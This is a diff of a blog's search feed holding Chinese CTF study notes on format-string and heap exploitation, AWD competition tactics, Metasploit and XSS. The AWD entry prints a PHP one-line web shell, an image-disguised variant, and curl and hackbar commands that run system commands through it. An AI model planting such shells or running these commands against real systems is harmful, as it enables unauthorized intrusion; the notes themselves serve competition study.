src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002213.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002310.png" alt="image.png"></p><p>没有system<br>1）找到libc的真实地址  之前那个题是题目给提供了一个函数，然后给打印出来了</p><p>没有&#x2F;bin&#x2F;sh<br>1）有没有其他符号末尾有sh，可以调用<br>2）用rop将&#x2F;bin&#x2F;sh读入缓冲区，而且地址是固定的，例如bss<br>3）泄露了libc的地址，可以用libc里面的任何东西</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002528.png" alt="image.png"></p><p>有sh，不一定是可用的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002621.png" alt="image.png"></p><p>libc里面有&#x2F;bin&#x2F;sh，可以用的<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002755.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819003118.png" alt="image.png"></p><p>但是有write函数</p><h2 id="day6"><a href="#day6" class="headerlink" title="day6"></a>day6</h2><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>字符串截断</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hello world\x00password<br>hello world\x41password<br><br><span class="hljs-function"><span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;%p&quot;</span>, <span class="hljs-string">&quot;Hello world&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>通过%p泄露出canary，构造exp的时候再填回去</p><p>%p是把栈上的值直接打印出来<br>%s是把栈上的值当成一个地址，把这个地址指向的内容打印出来</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819220435.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819220558.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819221142.png" alt="image.png"></p><p>取第3个参数</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819221419.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819222301.png" alt="image.png"></p><p>%n 任意地址写</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819225155.png" alt="image.png"></p><p>%hhn 一个字节<br>%hn  两个字节<br>%n     四个字节</p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819225818.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819230100.png" alt="image.png"></p><h3 id="练习题2"><a href="#练习题2" class="headerlink" title="练习题2"></a>练习题2</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819231108.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819231119.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819231422.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819232013.png" alt="image.png"></p><p>64位 前6位参数存到了寄存器中</p><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>mmap  memory map</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819234617.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819235616.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230820000051.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230820000118.png" alt="image.png"></p><h2 id="day1-1"><a href="#day1-1" class="headerlink" title="day1"></a>day1</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821210735.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821214659.png" alt="image.png"></p><p>0x8 0x10 0x18 0x20</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821213742.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821214010.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">p ptr<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821214444.png" alt="image.png"></p><p>previous size复用<br>因为previous size表示上一个chunk是free chunk的size大小，此时上一个chunk不是free chunk，所以这个previous size就没用了</p><p>fashbin中的size，即使free掉，最后一位也还是1</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821215503.png" alt="image.png"></p><p>物理链表：看上一个chunk是不是空闲，然后合并<br>逻辑链表：如下图</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821220136.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821220442.png" alt="image.png"></p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>只有fastbin和？是单向的，其他的bin都是双向的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821221907.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821222905.png" alt="image.png"><br>how2heap</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821231355.png" alt="image.png"></p><p>gdb6433</p><h1 id="day2-1"><a href="#day2-1" class="headerlink" title="day2"></a>day2</h1><p>unsorted bin绝大多数是为了fastbin创造条件的<br>unsorted bin 双向链表<br>house of xxx 一般是多个漏洞的结合</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822205923.png" alt="image.png"></p><p>fsb  - format string bug 格式化字符串漏洞</p><h3 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h3><p>最简单、最模板化的堆题目</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822214000.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822214131.png" alt="image.png"></p><p>去除了符号表</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822215801.png" alt="image.png"></p><p>fastbin 后进先出</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822221103.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822221922.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822223454.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822223118.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/f2def47484f422d3854051967a63483.png" alt="f2def47484f422d3854051967a63483.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822222816.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822222459.png" alt="image.png"></p>]]></content>
     
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-      <category>unsupported</category>
-      
-    </categories>
     
     
   </entry>
@@ -278,20 +259,12 @@
   
   
   <entry>
-    <title></title>
+    <title>【awd】工具及方法记录</title>
     <link href="/2023/08/13/ctf/unsupported/%E3%80%90awd%E3%80%91%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%96%B9%E6%B3%95%E8%AE%B0%E5%BD%95/"/>
     <url>/2023/08/13/ctf/unsupported/%E3%80%90awd%E3%80%91%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%96%B9%E6%B3%95%E8%AE%B0%E5%BD%95/</url>
     
     <content type="html"><![CDATA[<p>找ip  提前写好脚本，跑脚本</p><p>nmap扫了一下地址，发现http有几个是admin，看了相关文件夹，还有一个git</p><p>怎么加固？<br>得拖到本地审计</p><p>直接在管理员后台关掉了 在管理员页面直接关了</p><p>数据库<br>配置文件 cms 123456 mysql_config.php<br>config.php</p><h1 id="awd-3"><a href="#awd-3" class="headerlink" title="awd 3"></a>awd 3</h1><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"># nmap -v -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.20.201</span><br></code></pre></td></tr></table></figure><h1 id="日常记录"><a href="#日常记录" class="headerlink" title="日常记录"></a>日常记录</h1><h2 id="hackbar执行windows下的密码函数，post数据传递"><a href="#hackbar执行windows下的密码函数，post数据传递" class="headerlink" title="hackbar执行windows下的密码函数，post数据传递"></a>hackbar执行windows下的密码函数，post数据传递</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 木马函数</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># hackbar利用函数 windows</span><br>cmd=<span class="hljs-title function_ invoke__">system</span>(dir);<br>cmd=<span class="hljs-title function_ invoke__">system</span>(ipconfig);<br><br><span class="hljs-comment"># hackbar利用函数 linux</span><br>cmd=<span class="hljs-title function_ invoke__">system</span>(ls);<br>cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls -l&quot;</span>);<br>cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><span class="hljs-comment"># curl利用</span><br>curl http:<span class="hljs-comment">//xxx/admin/images/yjh.php -XPOST -H &#x27;Content-type: application/x-www-form-urlencoded&#x27; -d&quot;123=system(&#x27;cat /flag&#x27;);&quot;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 木马函数</span><br>GIF89a<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br><br>直接利用就可以<br></code></pre></td></tr></table></figure><h2 id="字符转换"><a href="#字符转换" class="headerlink" title="字符转换"></a>字符转换</h2><p>crlf -&gt; lf</p><h2 id="找组委会"><a href="#找组委会" class="headerlink" title="找组委会"></a>找组委会</h2><p>php能不能重启<br>watchbird能不能用</p>]]></content>
     
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-      <category>unsupported</category>
-      
-    </categories>
     
     
   </entry>
@@ -318,62 +291,25 @@
   
   
   <entry>
-    <title></title>
+    <title>【ctf系列】metasploit</title>
     <link href="/2023/08/12/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91metasploit/"/>
     <url>/2023/08/12/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91metasploit/</url>
     
     <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812211411.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812211639.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">show exploits<br><br>info<br>back<br><br>search ms17<br>search <span class="hljs-built_in">type</span>:auxiliary name:ms17<br>search <span class="hljs-built_in">type</span>:exploit name:ms17<br>search <span class="hljs-built_in">type</span>:payload<br><br><span class="hljs-built_in">set</span> rhosts x.x.x.x<br></code></pre></td></tr></table></figure><p>445端口<br>smb协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whois<br></code></pre></td></tr></table></figure><p>密码生成器：genpAss</p><p>phpmyadmin 4.8.1后台getshell</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812234818.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812235037.png" alt="image.png"></p><p>msfconsole</p>]]></content>
     
     
-    <categories>
-      
-      <category>ctf</category>
-      
-      <category>unsupported</category>
-      
-    </categories>
-    
     
   </entry>
   
   
   
   <entry>
-    <title></title>
-    <link href="/2023/08/09/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
-    <url>/2023/08/09/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    
-    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230809203556.png" alt="image.png"></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-      <category>unsupported</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title></title>
+    <title>【ctf系列】XSS</title>
     <link href="/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/"/>
     <url>/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/</url>
     
     <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808205604.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808211215.png" alt="image.png"></p><p>Burpsuite：<br>Encoder  将一个url变成url的编码方式<br>Render 渲染</p><p>window.location 重定向</p><p>nc -vnlp 80 监听80端口</p><h1 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup 2"></a>writeup 2</h1><p><a href="https://www.charseki.com/archives/xss-test-platform">XSS Test Platform</a></p>]]></content>
     
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-      <category>unsupported</category>
-      
-    </categories>
     
     
   </entry>
@@ -2440,31 +2376,6 @@
   
   
   <entry>
-    <title>【go语言系列】安装k8s的controller相关组件：deepcopy-gen和controller-gen</title>
-    <link href="/2022/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E5%AE%89%E8%A3%85k8s%E7%9A%84controller%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%EF%BC%9Adeepcopy-gen%E5%92%8Ccontroller-gen/"/>
-    <url>/2022/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E5%AE%89%E8%A3%85k8s%E7%9A%84controller%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%EF%BC%9Adeepcopy-gen%E5%92%8Ccontroller-gen/</url>
-    
-    <content type="html"><![CDATA[<h2 id="deepcopy-gen"><a href="#deepcopy-gen" class="headerlink" title="deepcopy-gen"></a>deepcopy-gen</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">go get -u k8s.io/code-generator/...<br><span class="hljs-comment"># 上面如果不成功，手工安装各种工具</span><br>git <span class="hljs-built_in">clone</span> https://github.com/kubernetes/code-generator<br><span class="hljs-built_in">cd</span> code-generator<br>go build -o deepcopy-gen cmd/deepcopy-gen/main.go<br><span class="hljs-built_in">cp</span> deepcopy-gen ~/go_projects/bin/   <span class="hljs-comment"># 放到/usr/local/bin下也可以</span><br></code></pre></td></tr></table></figure><p>参考： <a href="https://www.cxyzjd.com/article/ch717828/106008698">https://www.cxyzjd.com/article/ch717828/106008698</a></p><h2 id="controller-gen"><a href="#controller-gen" class="headerlink" title="controller-gen"></a>controller-gen</h2><p>下载地址：<a href="https://github.com/kubernetes-sigs/controller-tools/releases">https://github.com/kubernetes-sigs/controller-tools/releases</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># wget https://github.com/kubernetes-sigs/controller-tools/archive/refs/tags/v0.8.0.tar.gz</span><br><span class="hljs-comment"># tar -zxvf v0.8.0.tar.gz</span><br><span class="hljs-comment"># cd controller-tools-0.8.0</span><br><span class="hljs-comment"># go build -a -o controller-gen cmd/controller-gen/main.go</span><br><span class="hljs-comment"># mv controller-gen /usr/local/bin/</span><br><span class="hljs-comment"># controller-gen --version</span><br>Version: (devel)<br></code></pre></td></tr></table></figure><p>参考：</p><p><a href="https://support.huaweicloud.com/devg-osc/osc_ss_0052.html">https://support.huaweicloud.com/devg-osc/osc_ss_0052.html</a></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>go</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>go</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>【git】git每次都要输入密码</title>
     <link href="/2022/05/22/git/%E3%80%90git%E3%80%91git%E6%AF%8F%E6%AC%A1%E9%83%BD%E8%A6%81%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/"/>
     <url>/2022/05/22/git/%E3%80%90git%E3%80%91git%E6%AF%8F%E6%AC%A1%E9%83%BD%E8%A6%81%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/</url>
@@ -2482,6 +2393,31 @@
     <tags>
       
       <tag>git</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>【go语言系列】安装k8s的controller相关组件：deepcopy-gen和controller-gen</title>
+    <link href="/2022/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E5%AE%89%E8%A3%85k8s%E7%9A%84controller%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%EF%BC%9Adeepcopy-gen%E5%92%8Ccontroller-gen/"/>
+    <url>/2022/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E5%AE%89%E8%A3%85k8s%E7%9A%84controller%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%EF%BC%9Adeepcopy-gen%E5%92%8Ccontroller-gen/</url>
+    
+    <content type="html"><![CDATA[<h2 id="deepcopy-gen"><a href="#deepcopy-gen" class="headerlink" title="deepcopy-gen"></a>deepcopy-gen</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">go get -u k8s.io/code-generator/...<br><span class="hljs-comment"># 上面如果不成功，手工安装各种工具</span><br>git <span class="hljs-built_in">clone</span> https://github.com/kubernetes/code-generator<br><span class="hljs-built_in">cd</span> code-generator<br>go build -o deepcopy-gen cmd/deepcopy-gen/main.go<br><span class="hljs-built_in">cp</span> deepcopy-gen ~/go_projects/bin/   <span class="hljs-comment"># 放到/usr/local/bin下也可以</span><br></code></pre></td></tr></table></figure><p>参考： <a href="https://www.cxyzjd.com/article/ch717828/106008698">https://www.cxyzjd.com/article/ch717828/106008698</a></p><h2 id="controller-gen"><a href="#controller-gen" class="headerlink" title="controller-gen"></a>controller-gen</h2><p>下载地址：<a href="https://github.com/kubernetes-sigs/controller-tools/releases">https://github.com/kubernetes-sigs/controller-tools/releases</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># wget https://github.com/kubernetes-sigs/controller-tools/archive/refs/tags/v0.8.0.tar.gz</span><br><span class="hljs-comment"># tar -zxvf v0.8.0.tar.gz</span><br><span class="hljs-comment"># cd controller-tools-0.8.0</span><br><span class="hljs-comment"># go build -a -o controller-gen cmd/controller-gen/main.go</span><br><span class="hljs-comment"># mv controller-gen /usr/local/bin/</span><br><span class="hljs-comment"># controller-gen --version</span><br>Version: (devel)<br></code></pre></td></tr></table></figure><p>参考：</p><p><a href="https://support.huaweicloud.com/devg-osc/osc_ss_0052.html">https://support.huaweicloud.com/devg-osc/osc_ss_0052.html</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>go</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>go</tag>
       
     </tags>
     
